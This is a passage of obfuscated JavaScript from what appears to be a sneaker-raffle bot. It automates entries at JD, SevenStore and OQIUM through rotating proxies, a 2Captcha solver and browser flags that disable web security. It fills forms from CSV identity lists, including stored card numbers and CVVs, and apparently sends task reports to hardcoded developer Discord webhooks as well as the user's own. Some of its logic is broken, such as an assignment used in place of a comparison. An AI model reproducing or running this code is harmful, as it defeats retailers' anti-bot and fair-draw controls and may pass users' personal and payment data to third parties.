_0x2e6b61['click']()), await _0x1f4682(0x1b58), await _0x240c2c['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x240c2c['$eval']('.edit_checkout.animate-floating-labels', _0x52c3f0 => _0x52c3f0['submit']()), await _0x1f4682(0x7d0);
            try {
                await _0x240c2c['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), console['log'](_0xeca352['green'](_0x3a3ee9() + '\x20[' + _0x5ca785['name'] + ']\x20Task\x20' + (_0x2f8284 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
            } catch (_0x41c5e5) {
                throw new Error('Error\x20Processing\x20Order:\x20' + _0x41c5e5['message']);
            }
            var _0x19b522 = await _0x2221dc(_0x1ac722[_0x2f8284], _0x5ca785, 'dev', ![]), _0x2d030d = await _0x2221dc(_0x1ac722[_0x2f8284], _0x5ca785, 'pub', ![]);
            const _0x2a0c1a = {
                'succesDEVMSG': { 'embeds': [_0x19b522] },
                'succesPUBMSG': { 'embeds': [_0x2d030d] }
            };
            try {
                _0x202e3d['webhook'] != undefined && _0x202e3d['webhook'] != '' && await _0x10557a(_0x202e3d['webhook'], _0x2a0c1a['succesDEVMSG']), await _0x1f4682(0xc8), await _0x10557a(_0x16dc96, _0x2a0c1a['succesDEVMSG']), await _0x1f4682(0xc8), await _0x10557a(_0x146b83, _0x2a0c1a['succesPUBMSG']);
            } catch (_0x3830f3) {
                console['log'](_0xeca352['yellow'](_0x3a3ee9() + '\x20[' + _0x1b0085[taskModule]['name'] + ']\x20Task\x20' + (_0x2f8284 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x3830f3));
            }
        } catch (_0x5c4630) {
            console['log'](_0xeca352['red'](_0x3a3ee9() + '\x20[' + _0x1b0085[taskModule]['name'] + ']\x20Task\x20' + (_0x2f8284 + 0x1) + '\x20:\x20' + _0x5c4630)), _0x3ed547 = '' + _0x5c4630;
            var _0x4fa0ae = await _0x2221dc(kickz[_0x2f8284], _0x5ca785, 'dev', !![], _0x3ed547);
            EMBEDS['errorDEV'] = { 'embeds': [_0x4fa0ae] }, _0x202e3d['webhook'] != undefined && _0x202e3d['webhook'] != '' && await _0x10557a(_0x202e3d['webhook'], EMBEDS['errorDEV']), await _0x10557a(_0x3df8e6, EMBEDS['errorDEV']), _0x4638ba = 'yes';
        } finally {
            _0x23c102 && _0x23c102['close']();
            if (_0x4638ba == 'yes' && _0x5dc3a3 != 0x5) {
                console['log'](_0xeca352['red'](_0x3a3ee9() + '\x20[' + _0x5ca785['name'] + ']\x20Task\x20' + (_0x2f8284 + 0x1) + '\x20:\x20Retrying')), _0x2f8284 = _0x2f8284 - 0x1, _0x5dc3a3 = _0x5dc3a3 + 0x1;
                continue;
            }
            console['log']('Waiting\x20for\x20' + _0x202e3d['delay'] + '\x20ms'), await _0x1f4682(_0x202e3d['delay']);
        }
    }
}
async function _0xf95062(_0x5d0a3f, _0x276f5a, _0x50fe8b) {
    var _0x2d8af6 = ![], _0x1ca23d = ![];
    if (_0x202e3d['captchaKey'] == '' || _0x202e3d['captchaKey'] == undefined)
        return console['log'](_0xeca352['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
    _0x3d4a9f['use'](_0x42d8ce()), _0x3d4a9f['use'](_0x484dec({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x202e3d['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x31c36e = 0x0; _0x31c36e < _0x276f5a['length']; _0x31c36e++) {
        var _0x55f8cf, _0x10a753 = [{
            'type': 'rich',
            'title': 'Succesful\x20JD\x20entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'Product',
                    'value': '' + _0x276f5a[_0x31c36e]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x276f5a[_0x31c36e]['Size']
                },
                {
                    'name': 'User',
                    'value': '' + _0x1b651e
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x202e3d['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x49eea2
                }
            ]
        }];
        const _0x2e9abb = { 'embeds': _0x10a753 };
        _0x4dc5fe(_0x5d0a3f['name'] + '\x20Task\x20' + (_0x31c36e + 0x1) + '\x20/\x20' + _0x276f5a['length'] + '\x20||\x20File:\x20' + _0x3733f2 + '\x20Proxies:\x20' + _0xc68ec8), await _0x2a3946(_0x276f5a, _0x31c36e);
        var _0x18bf56 = await _0x2221dc(_0x276f5a[_0x31c36e], _0x5d0a3f, 'dev', ![]), _0x53f813 = await _0x2221dc(_0x276f5a[_0x31c36e], _0x5d0a3f, 'pub', ![]);
        const _0x404304 = {
            'succesDEVMSG': { 'embeds': [_0x18bf56] },
            'succesPUBMSG': { 'embeds': [_0x53f813] }
        };
        if (_0x202e3d['webhook'] != undefined && _0x202e3d['webhook'] != '')
            try {
                await _0x10557a(_0x202e3d['webhook'], _0x404304['succesDEVMSG']);
            } catch {
            }
        await _0x1f4682(0xc8), await _0x10557a(_0x16dc96, _0x404304['succesDEVMSG']), await _0x1f4682(0xc8);
        try {
            await _0x10557a(_0x146b83, _0x404304['succesPUBMSG']);
        } catch {
        }
        if (_0x276f5a[_0x31c36e]['Email'] == '' || _0x276f5a[_0x31c36e]['Url'] == '' || _0x276f5a[_0x31c36e]['FirstName'] == '' || _0x276f5a[_0x31c36e]['LastName'] == '') {
            console['log'](_0x3a3ee9() + '\x20[' + _0x1b0085[taskModule]['name'] + ']\x20Task\x20' + (_0x31c36e + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x202e3d['useRandomProxy'] = ![])
            var _0x4ae4f3 = _0x50fe8b[_0x31c36e]['split'](':');
        else
            var _0x4b27d1 = Math['round'](Math['random']() * (_0x50fe8b['length'] - 0x1)), _0x4ae4f3 = _0x50fe8b[_0x4b27d1]['split'](':');
        const _0x238af3 = await _0x3d4a9f['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x4ae4f3[0x0] + ':' + _0x4ae4f3[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x5a49e7 = await _0x238af3['newPage']();
            await _0x5a49e7['authenticate']({
                'username': '' + _0x4ae4f3[0x2],
                'password': '' + _0x4ae4f3[0x3]
            }), console['log'](_0x3a3ee9() + '\x20[' + _0x5d0a3f['name'] + ']\x20Task\x20' + (_0x31c36e + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5a49e7['setRequestInterception'](!![]), _0x5a49e7['on']('request', _0x346a6f => {
                _0x346a6f['resourceType']() === 'image' || _0x346a6f['resourceType']() === 'font' || _0x346a6f['resourceType']() === 'media' ? _0x346a6f['abort']() : _0x346a6f['continue']();
            }), await _0x5a49e7['goto']('' + _0x276f5a[_0x31c36e]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            });
            try {
                await _0x5a49e7['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
            } catch {
                throw new Error('Not\x20an\x20Active\x20Raffle');
            }
            console['log'](_0x3a3ee9() + '\x20[' + _0x5d0a3f['name'] + ']\x20Task\x20' + (_0x31c36e + 0x1) + '\x20:\x20Filling\x20Information'), await _0x5a49e7['type']('#comp_firstname', '' + _0x276f5a[_0x31c36e]['FirstName']), await _0x5a49e7['waitForSelector']('#comp_lastname'), await _0x5a49e7['type']('#comp_lastname', '' + _0x276f5a[_0x31c36e]['LastName']), await _0x5a49e7['waitForSelector']('#comp_email'), await _0x5a49e7['type']('#comp_email', '' + _0x276f5a[_0x31c36e]['Email']), await _0x5a49e7['waitForSelector']('#comp_paypalemail'), await _0x5a49e7['type']('#comp_paypalemail', '' + _0x276f5a[_0x31c36e]['Email']), await _0x5a49e7['waitForSelector']('#comp_mobile_end'), await _0x5a49e7['type']('#comp_mobile_end', '' + _0x276f5a[_0x31c36e]['Phone']), await _0x5a49e7['waitForSelector']('#comp_dob'), await _0x5a49e7['type']('#comp_dob', '08/09/1992'), console['log'](_0x3a3ee9() + '\x20[' + _0x5d0a3f['name'] + ']\x20Task\x20' + (_0x31c36e + 0x1) + '\x20:\x20Choosing\x20Size');
            if (_0x276f5a[_0x31c36e]['Size'] == 'RANDOM') {
                const _0x21b589 = await _0x5a49e7['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x16a34c => {
                    return _0x16a34c['map'](_0x2c2713 => _0x2c2713['value']);
                });
                var _0x5ad2e0 = Math['round'](Math['random']() * (_0x21b589['length'] - 0x2));
                await _0x5a49e7['select']('#shoesize', _0x21b589[_0x5ad2e0 + 0x1]), await _0x1f4682(0x3e8);
            } else {
                const _0x3c8cb2 = await _0x5a49e7['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x505ace => {
                    return _0x505ace['map'](_0x591ada => _0x591ada['innerText']);
                }), _0x1b1cf4 = await _0x5a49e7['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x46ac7c => {
                    return _0x46ac7c['map'](_0x8260b8 => _0x8260b8['value']);
                });
                var _0x5f5de8 = _0x276f5a[_0x31c36e]['Size'];
                for (var _0x2e870c = 0x1; _0x2e870c < _0x1b1cf4['length']; _0x2e870c++) {
                    var _0xd99b1a = _0x3c8cb2[_0x2e870c]['split']('\x20')[0x0];
                    if (_0xd99b1a == _0x5f5de8) {
                        await _0x5a49e7['select']('#shoesize', _0x1b1cf4[_0x2e870c]);
                        break;
                    } else {
                        if (_0x2e870c + 0x1 == _0x1b1cf4['length'])
                            throw new Error('Size\x20Not\x20Found..');
                    }
                }
            }
            await _0x5a49e7['waitForSelector']('#comp_address1'), await _0x5a49e7['type']('#comp_address1', _0x276f5a[_0x31c36e]['Address1'] + '\x20' + _0x276f5a[_0x31c36e]['HouseNumber']), await _0x5a49e7['waitForSelector']('#comp_address2'), await _0x5a49e7['type']('#comp_address2', '' + _0x276f5a[_0x31c36e]['Address2']), await _0x5a49e7['waitForSelector']('#comp_address2'), await _0x5a49e7['type']('#comp_address3', '' + _0x276f5a[_0x31c36e]['City']), await _0x5a49e7['waitForSelector']('#comp_postcode'), await _0x5a49e7['type']('#comp_postcode', '' + _0x276f5a[_0x31c36e]['Zip']), console['log'](_0x3a3ee9() + '\x20[' + _0x5d0a3f['name'] + ']\x20Task\x20' + (_0x31c36e + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x1f4682(0x4b0), await _0x5a49e7['click']('label#emailhold'), await _0x1f4682(0x5dc), await _0x5a49e7['click']('#preauth_tandc_email\x20>\x20label'), await _0x1f4682(0x5dc), await _0x5a49e7['click']('#submit'), await _0x5a49e7['waitForSelector']('#paymentWrap'), console['log'](_0x3a3ee9() + '\x20[' + _0x5d0a3f['name'] + ']\x20Task\x20' + (_0x31c36e + 0x1) + '\x20:\x20' + _0xeca352['blue']('Awaiting\x20Paypal\x20Payment')), _0x238af3['on']('targetcreated', async _0x55418d => {
                if (_0x55418d['type']() === 'page') {
                    const _0x4176a1 = await _0x55418d['page']();
                    async function _0x5be475() {
                        try {
                            await _0x5a49e7['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x1ca23d = !![];
                            return;
                        } catch {
                        }
                    }
                    async function _0x3100b6() {
                        try {
                            await _0x5a49e7['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x2d8af6 = !![];
                            return;
                        } catch {
                        }
                    }
                    _0x3100b6(), _0x5be475(), await _0x1f4682(0x493e0);
                }
            });
            async function _0x4cb487() {
                for (let _0x157c39 = 0x0; _0x157c39 < 0x12c; _0x157c39++) {
                    if (_0x2d8af6 == !![]) {
                        console['log'](_0xeca352['green'](_0x3a3ee9() + '\x20[' + _0x5d0a3f['name'] + ']\x20Task\x20' + (_0x31c36e + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        if (_0x202e3d['webhook'] != undefined && _0x202e3d['webhook'] != '')
                            try {
                                await _0x10557a(_0x202e3d['webhook'], _0x404304['succesDEVMSG']);
                            } catch {
                            }
                        await _0x1f4682(0xc8), await _0x10557a(_0x16dc96, _0x404304['succesDEVMSG']), await _0x1f4682(0xc8);
                        try {
                            await _0x10557a(_0x146b83, _0x404304['succesPUBMSG']);
                        } catch {
                        }
                        return;
                    } else {
                        if (_0x1ca23d)
                            throw new Error('Paypal\x20Error:\x20Target\x20closed');
                        else
                            await _0x1f4682(0x3e8);
                    }
                }
                throw new Error('Paypal\x20Error');
            }
            await _0x1f4682(0xbb8), await _0x5a49e7['click']('.zoid-outlet'), await _0x1f4682(0x7d0), await _0x4cb487();
        } catch (_0x882e85) {
            console['log'](_0xeca352['red'](_0x3a3ee9() + '\x20[' + _0x5d0a3f['name'] + ']\x20Task\x20' + (_0x31c36e + 0x1) + '\x20:\x20' + _0x882e85)), _0x55f8cf = '' + _0x882e85;
            var _0x53d30a = await _0x2221dc(_0x276f5a[_0x31c36e], _0x5d0a3f, 'dev', !![], _0x55f8cf);
            _0x404304['errorDEV'] = { 'embeds': [_0x53d30a] }, _0x202e3d['webhook'] != undefined && _0x202e3d['webhook'] != '' && await _0x10557a(_0x202e3d['webhook'], _0x404304['errorDEV']), await _0x10557a(_0x3df8e6, _0x404304['errorDEV']);
        } finally {
            _0x238af3 && _0x238af3['close'](), console['log']('Waiting\x20for\x20' + _0x202e3d['delay'] + '\x20ms'), await _0x1f4682(_0x202e3d['delay']);
        }
    }
}
async function _0x38ade3(_0x4a48fa, _0x9d4a3e, _0x4bd762) {
    _0x3d4a9f['use'](_0x42d8ce()), _0x3d4a9f['use'](_0x484dec({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x202e3d['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x10e4cf = 0x0; _0x10e4cf < _0x9d4a3e['length']; _0x10e4cf++) {
        _0x4dc5fe(_0x4a48fa['name'] + '\x20Task\x20' + (_0x10e4cf + 0x1) + '\x20/\x20' + _0x9d4a3e['length'] + '\x20||\x20File:\x20' + _0x3733f2 + '\x20Proxies:\x20' + _0xc68ec8);
        var _0x575b37 = [{
            'type': 'rich',
            'title': 'Succesful\x20SevenStore\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x1b651e
                },
                {
                    'name': 'Product',
                    'value': '' + _0x9d4a3e[_0x10e4cf]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x9d4a3e[_0x10e4cf]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x202e3d['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x202e3d['version']
                }
            ]
        }];
        const _0x390b71 = { 'embeds': _0x575b37 };
        await _0x2a3946(_0x9d4a3e, _0x10e4cf);
        if (_0x9d4a3e[_0x10e4cf]['Email'] == '' || _0x9d4a3e[_0x10e4cf]['Password'] == '' || _0x9d4a3e[_0x10e4cf]['FirstName'] == '' || _0x9d4a3e[_0x10e4cf]['LastName'] == '') {
            console['log'](_0x3a3ee9() + '\x20[' + _0x4a48fa['name'] + ']\x20Task\x20' + (_0x10e4cf + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        (_0x9d4a3e[_0x10e4cf]['Password'] == '' || _0x9d4a3e[_0x10e4cf]['Password'] == undefined) && (_0x9d4a3e[_0x10e4cf]['Password'] = 'ErehsaWonRaj1!');
        if (_0x202e3d['useRandomProxy'] = ![])
            var _0x3e9adf = _0x4bd762[_0x10e4cf]['split'](':');
        else
            var _0x33acb9 = Math['round'](Math['random']() * (_0x4bd762['length'] - 0x1)), _0x3e9adf = _0x4bd762[_0x33acb9]['split'](':');
        const _0x4b86f2 = await _0x3d4a9f['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x3e9adf[0x0] + ':' + _0x3e9adf[0x1],
                '--no-sandbox',
                '--incognito',
                '--disable-web-security',
                '--disable-features=IsolateOrigins',
                '\x20--disable-site-isolation-trials',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x4fb3fd = await _0x4b86f2['newPage']();
            await _0x4fb3fd['authenticate']({
                'username': '' + _0x3e9adf[0x2],
                'password': '' + _0x3e9adf[0x3]
            }), console['log'](_0x3a3ee9() + '\x20[' + _0x4a48fa['name'] + ']\x20Task\x20' + (_0x10e4cf + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4fb3fd['setRequestInterception'](!![]), _0x4fb3fd['on']('request', _0x816f0d => {
                _0x816f0d['resourceType']() === 'image' || _0x816f0d['resourceType']() === 'font' || _0x816f0d['resourceType']() === 'media' ? _0x816f0d['abort']() : _0x816f0d['continue']();
            }), await _0x4fb3fd['setViewport']({
                'width': 0x500,
                'height': 0x2d0
            }), await _0x4fb3fd['goto']('' + _0x9d4a3e[_0x10e4cf]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0x1d4c0
            }), await _0x4fb3fd['waitForSelector']('#btnPdpAtb'), console['log'](_0x3a3ee9() + '\x20[' + _0x4a48fa['name'] + ']\x20Task\x20' + (_0x10e4cf + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x9d4a3e[_0x10e4cf]['Size']);
            const _0x3fc6e2 = await _0x4fb3fd['$$eval']('div.pointer.pdpsizeoption.f-12.f-color3', _0x544893 => {
                return _0x544893['map'](_0x48df3f => _0x48df3f['innerText']);
            }), _0xb8c919 = await _0x4fb3fd['$$']('div.pointer.pdpsizeoption.f-12.f-color3'), _0x4cc171 = ![];
            if (_0x9d4a3e[_0x10e4cf]['Size'] == 'RANDOM') {
                var _0xc7580f = Math['round'](Math['random']() * (_0xb8c919['length'] - 0x1));
                await _0xb8c919[_0xc7580f]['click']();
            } else
                for (var _0x42a22d = 0x0; _0x42a22d < _0x3fc6e2['length']; _0x42a22d++) {
                    if (_0x3fc6e2[_0x42a22d] != _0x9d4a3e[_0x10e4cf]['Size'])
                        continue;
                    try {
                        await _0xb8c919[_0x42a22d]['click']();
                    } catch {
                        console['log'](_0xeca352['red'](_0x3a3ee9() + '\x20[' + _0x4a48fa['name'] + ']\x20Task\x20' + (_0x10e4cf + 0x1) + '\x20:\x20Size\x20Not\x20Found')), _0x4cc171 = !![];
                    }
                }
            if (_0x4cc171)
                continue;
            await _0x1f4682(0x578), await _0x4fb3fd['click']('#btnPdpAtb'), await _0x4fb3fd['waitForSelector']('.fa.fa-check-circle.f-color8.f-30.valign-middle-important'), await _0x1f4682(0x3e8), console['log'](_0x3a3ee9() + '\x20[' + _0x4a48fa['name'] + ']\x20Task\x20' + (_0x10e4cf + 0x1) + '\x20:\x20Getting\x20Checkout\x20Session'), await _0x4fb3fd['goto']('https://www.sevenstore.com/login/?target=checkout'), await _0x4fb3fd['waitForSelector']('#email'), await _0x4fb3fd['type']('#email', _0x9d4a3e[_0x10e4cf]['Email']), await _0x1f4682(0x226), await _0x4fb3fd['click']('#guest-submit'), await _0x1f4682(0x1b58), console['log'](_0x3a3ee9() + '\x20[' + _0x4a48fa['name'] + ']\x20Task\x20' + (_0x10e4cf + 0x1) + '\x20:\x20Filling\x20Information'), await _0x4fb3fd['waitForSelector']('#firstname'), await _0x4fb3fd['type']('#firstname', _0x9d4a3e[_0x10e4cf]['FirstName'], 0x1f4), await _0x1f4682(0x190), await _0x4fb3fd['waitForSelector']('#surname'), await _0x4fb3fd['type']('#surname', _0x9d4a3e[_0x10e4cf]['LastName'], 0x1f4), await _0x1f4682(0x190), await _0x4fb3fd['waitForSelector']('#mobile'), await _0x4fb3fd['type']('#mobile', _0x9d4a3e[_0x10e4cf]['Phone'], 0x1f4), await _0x1f4682(0x190), await _0x4fb3fd['click']('#enterManualDiv'), await _0x1f4682(0x5dc), await _0x4fb3fd['waitForSelector']('#address1'), await _0x4fb3fd['type']('#address1', _0x9d4a3e[_0x10e4cf]['Address1'] + '\x20' + _0x9d4a3e[_0x10e4cf]['HouseNumber'], 0x226), await _0x1f4682(0x384), await _0x4fb3fd['waitForSelector']('#address2'), await _0x4fb3fd['type']('#address2', '' + _0x9d4a3e[_0x10e4cf]['Address2'], 0x226), await _0x1f4682(0x320);
            const _0x2c4a6d = await _0x4fb3fd['$$eval']('#countryselect_view3\x20>\x20option', _0x42a699 => {
                return _0x42a699['map'](_0x4dd7ed => _0x4dd7ed['value']);
            });
            var _0x1edf8c;
            for (var _0x2c347d = 0x0; _0x2c347d < _0x2c4a6d['length']; _0x2c347d++) {
                if (_0x2c4a6d[_0x2c347d]['startsWith']('' + _0x9d4a3e[_0x10e4cf]['Country'])) {
                    _0x1edf8c = _0x2c4a6d[_0x2c347d];
                    break;
                }
                continue;
            }
            await _0x4fb3fd['select']('#countryselect_view3', '' + _0x1edf8c), await _0x4fb3fd['waitForSelector']('#address4'), await _0x4fb3fd['type']('#address4', '' + _0x9d4a3e[_0x10e4cf]['City'], 0x1f4), await _0x1f4682(0x384), await _0x4fb3fd['waitForSelector']('#postcode'), await _0x4fb3fd['type']('#postcode', '' + _0x9d4a3e[_0x10e4cf]['Zip'], 0x1f4), await _0x1f4682(0x4b0);
            const _0x56bf31 = await _0x4fb3fd['url']();
            console['log'](_0x3a3ee9() + '\x20[' + _0x4a48fa['name'] + ']\x20Task\x20' + (_0x10e4cf + 0x1) + '\x20:\x20Submitting\x20Entry');
            const _0x5d5318 = _0x56bf31['split']('?')[0x1], _0x2d443c = await _0x4fb3fd['$']('#co_address_submit');
            await _0x2d443c['evaluate'](_0x35b9e2 => _0x35b9e2['click']()), await _0x1f4682(0x1388), await _0x4fb3fd['goto']('https://www.sevenstore.com/checkout/pay/?' + _0x5d5318), console['log'](_0x3a3ee9() + '\x20[' + _0x4a48fa['name'] + ']\x20Task\x20' + (_0x10e4cf + 0x1) + '\x20:\x20Getting\x20Payment\x20session'), await _0x4fb3fd['waitForSelector']('#paymentbuttons'), await _0x1f4682(0x1388), await _0x4fb3fd['click']('#paymentbuttons\x20>\x20div'), await _0x1f4682(0x1c2), await _0x4fb3fd['waitForSelector']('#card-number'), await _0x4fb3fd['waitForSelector']('#card-number\x20>\x20div\x20>\x20iframe');
            const _0x322906 = await _0x4fb3fd['$']('#card-number\x20>\x20div\x20>\x20iframe'), _0xdf164a = await _0x322906['contentFrame']();
            await _0xdf164a['waitForSelector']('.InputContainer'), await _0xdf164a['click']('.InputContainer\x20>\x20input'), await _0x1f4682(0x578), await _0x4fb3fd['type']('#card-number', '' + _0x9d4a3e[_0x10e4cf]['CreditNumber']), await _0x1f4682(0xfa), await _0x4fb3fd['type']('#card-expiry', '' + _0x9d4a3e[_0x10e4cf]['ExpiryDate']), await _0x1f4682(0xfa), await _0x4fb3fd['type']('#card-cvc', '' + _0x9d4a3e[_0x10e4cf]['CVV']), await _0x1f4682(0x7d0), await _0x4fb3fd['click']('#card-button'), console['log'](_0x3a3ee9() + '\x20[' + _0x4a48fa['name'] + ']\x20Task\x20' + (_0x10e4cf + 0x1) + '\x20:\x20Awaiting\x203DS');
            try {
                await _0x4fb3fd['waitForSelector']('.btn-auxilliary.btn-sub.fullwidth', { 'timeout': 0x493e0 }), console['log'](_0xeca352['green'](_0x3a3ee9() + '\x20[' + _0x4a48fa['name'] + ']\x20Task\x20' + (_0x10e4cf + 0x1) + '\x20:\x20Raffle\x20Entered!')), await _0x10557a(_0x16dc96, _0x390b71);
            } catch {
                console['log'](_0xeca352['red'](_0x3a3ee9() + '\x20[' + _0x4a48fa['name'] + ']\x20Task\x20' + (_0x10e4cf + 0x1) + '\x20:\x203DS\x20Failed')), _0x575b37[0x0]['title'] = 'Failed\x20Seven\x20Entry', _0x575b37[0x0]['description'] = '3DS\x20Failed', await _0x10557a(_0x3df8e6, _0x390b71);
            }
        } catch (_0x47b5d3) {
            console['log'](_0xeca352['red'](_0x3a3ee9() + '\x20[' + _0x4a48fa['name'] + ']\x20Task\x20' + (_0x10e4cf + 0x1) + '\x20:\x20' + _0x47b5d3)), _0x575b37[0x0]['title'] = 'Failed\x20Seven\x20Entry', _0x575b37[0x0]['description'] = '' + _0x47b5d3, await _0x10557a(_0x3df8e6, _0x390b71);
        } finally {
            _0x4b86f2 && _0x4b86f2['close']();
            if (_0x10e4cf + 0x1 == _0x9d4a3e['length']) {
                console['log'](_0xeca352['green']('Finished\x20tasks,\x20returning\x20to\x20Main\x20Menu')), await _0x1f4682(0x7d0);
                break;
            }
            console['log']('Waiting\x20for\x20' + _0x202e3d['AfewDelay'] + '\x20ms'), await _0x1f4682(_0x202e3d['AfewDelay']);
        }
    }
}
async function _0x123f3e(_0xdb7c2c, _0x49b010, _0x448d47, _0x294061, _0xb9fe55) {
    var _0x8f1795, _0xbd6ad3 = {}, _0x331755 = [], _0xe89fc5 = {}, _0x5b3b19 = [
        '40',
        '40,5',
        '41',
        '42',
        '42,5',
        '43',
        '44',
        '45',
        '45,5',
        '46',
        '47',
        '47,5',
        '48'
    ];
    !_0x294061 && (_0x294061 = {});
    if (_0x49b010 != 'ver') {
        _0x4dc5fe(_0x448d47['name'] + '\x20Task\x20' + (_0xdb7c2c + 0x1) + '\x20/\x20' + _0x294061['length'] + '\x20||\x20File:\x20' + _0x3733f2 + '\x20Proxies:\x20' + _0xc68ec8), await _0x2a3946(_0x294061, _0xdb7c2c), _0x331755 = [{
            'type': 'rich',
            'title': 'Succesful\x20OQIUM\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x1b651e
                },
                {
                    'name': 'Size',
                    'value': '' + _0x294061[_0xdb7c2c]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x202e3d['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x49eea2
                }
            ]
        }], _0xe89fc5 = { 'embeds': _0x331755 }, _0xbd6ad3 = _0x448d47['data'];
        _0x49b010 == 'exp' ? _0xbd6ad3['data']['attributes']['email'] = '' + _0x294061[_0xdb7c2c]['FirstName'] + _0x294061[_0xdb7c2c]['LastName'] + _0x202e3d['catchall'] : _0xbd6ad3['data']['attributes']['email'] = '' + _0x294061[_0xdb7c2c]['Email'];
        if (_0x294061[_0xdb7c2c]['Size'] == 'RANDOM') {
        }
        _0xbd6ad3['data']['attributes']['properties']['$first_name'] = '' + _0x294061[_0xdb7c2c]['FirstName'], _0xbd6ad3['data']['attributes']['properties']['$last_name'] = '' + _0x294061[_0xdb7c2c]['LastName'], _0xbd6ad3['data']['attributes']['properties']['$address1'] = _0x294061[_0xdb7c2c]['Address1'] + '\x20' + _0x294061[_0xdb7c2c]['Address2'] + '\x20' + _0x294061[_0xdb7c2c]['HouseNumber'], _0xbd6ad3['data']['attributes']['properties']['$zip'] = '' + _0x294061[_0xdb7c2c]['Zip'], _0xbd6ad3['data']['attributes']['properties']['$city'] = '' + _0x294061[_0xdb7c2c]['City'], _0xbd6ad3['data']['attributes']['properties']['$country'] = '' + _0x294061[_0xdb7c2c]['Country'], _0xbd6ad3['data']['attributes']['properties']['Size'] = '' + _0x294061[_0xdb7c2c]['Size'], _0xbd6ad3['data']['attributes']['properties']['$phone_number'] = '' + _0x294061[_0xdb7c2c]['Phone'], _0xbd6ad3['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x294061[_0xdb7c2c]['Follower'];
    }
    if (_0x202e3d['useRandomProxy'] = ![])
        var _0x49825f = _0xb9fe55[_0xdb7c2c]['split'](':');
    else
        var _0x13ef1c = Math['round'](Math['random']() * (_0xb9fe55['length'] - 0x1)), _0x49825f = _0xb9fe55[_0x13ef1c]['split'](':');
    var _0x4e1346 = {
        'jar': _0x3850c3,
        'followAllRedirects': !![],
        'method': 'POST',
        'url': _0x448d47['url'],
        'headers': _0x448d47['headers'],
        'body': JSON['stringify'](_0xbd6ad3),
        'proxy': 'http://' + _0x49825f[0x2] + ':' + _0x49825f[0x3] + '@' + _0x49825f[0x0] + ':' + _0x49825f[0x1]
    };
    return _0x49b010 != 'ver' && (_0x4e1346['url'] = _0x448d47['url'], _0x4e1346['headers'] = _0x448d47['headers']), _0x49b010 == 'ver' && (_0x4e1346['method'] = 'GET'), new Promise(function (_0x62dafa, _0x32d178) {
        callback = async (_0x167b66, _0x16c952, _0x3b102c) => {
            if (!_0x167b66 && _0x16c952['statusCode'] == 0xca || !_0x167b66 && _0x16c952['statusCode'] == 0xc8) {
                if (_0x49b010 != 'ver') {
                    var _0x17efa5 = await _0x2221dc(_0x294061[_0xdb7c2c], _0x448d47, 'dev', ![]), _0x1821c9 = await _0x2221dc(_0x294061[_0xdb7c2c], _0x448d47, 'pub', ![]);
                    const _0x4ad5b5 = {
                        'succesDEVMSG': { 'embeds': [_0x17efa5] },
                        'succesPUBMSG': { 'embeds': [_0x1821c9] }
                    };
                    if (_0x202e3d['webhook'] != undefined && _0x202e3d['webhook'] != '')
                        try {
                            await _0x10557a(_0x202e3d['webhook'], _0x4ad5b5['succesDEVMSG']);
                        } catch {
                        }
                    await _0x1f4682(0xc8), await _0x10557a(_0x16dc96, _0x4ad5b5['succesDEVMSG']), await _0x1f4682(0xc8);
                    try {
                        await _0x10557a(_0x146b83, _0x4ad5b5['succesPUBMSG']);
                    } catch {
                    }
                }
                _0x62dafa(console['log'](_0xeca352['green'](_0x3a3ee9() + '\x20[' + _0x448d47['name'] + ']\x20Task\x20' + (_0xdb7c2c + 0x1) + ':\x20Raffle\x20Entered!')));
            } else {
                if (_0x49b010 != 'ver') {
                    var _0xa308df = '' + _0x167b66, _0x434355 = await _0x2221dc(_0x294061[_0xdb7c2c], _0x448d47, 'dev', !![], _0xa308df), _0xaceb45 = {};
                    _0xaceb45['errorDEV'] = { 'embeds': [_0x434355] }, _0x202e3d['webhook'] != undefined && _0x202e3d['webhook'] != '' && await _0x10557a(_0x202e3d['webhook'], _0xaceb45['errorDEV']), await _0x10557a(_0x3df8e6, _0xaceb45['errorDEV']);
                }
